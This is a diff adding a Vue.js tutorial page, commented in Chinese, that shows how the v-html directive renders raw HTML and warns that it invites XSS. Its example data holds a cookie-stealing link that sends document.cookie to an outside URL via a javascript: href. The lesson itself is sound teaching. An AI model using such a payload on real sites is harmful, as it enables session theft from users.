@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-html指令</title>
+    <!-- 引入vue -->
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<body>
+    <!-- 
+        v-html指令：
+           1.作用：向指定节点中渲染包含html结构的内容。
+           2.与插值语法的区别
+              (1).v-html会替换掉节点中所有的内容，{{xx}}则不会
+              (2).v-html可以识别html结构。
+           3.严重注意：v-html有安全性问题！！！
+              (1).在网站上动态渲染任意html是非常危险的，容易导致xss攻击。
+              (2).一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！！！   
+     -->
+   
+
+    <!-- 准备好一个容器 -->
+    <div id="root">
+        <h1>Hello {{name}}</h1>
+        <h1 v-text="str"></h1>
+        <h1 v-html="str">哈哈哈</h1>
+        <h1 v-html='str2'></h1>
+    </div>
+
+</body>
+
+
+<script type="text/javascript">
+    Vue.config.productionTip = false //设置为 false 以阻止 vue 在启动时生成生产提示。
+
+    new Vue({
+        el:'#root',
+        data(){
+            return{
+                name:'邱邱',
+                str:'<h3>你好啊！</h3>',
+                str2:'<a href=javascript:location.href="https://baidu.com?+document.cookie">找到你想要的资源了，快来！</a>'
+            }
+        }
+    })
+    
+</script>
+
+</html>
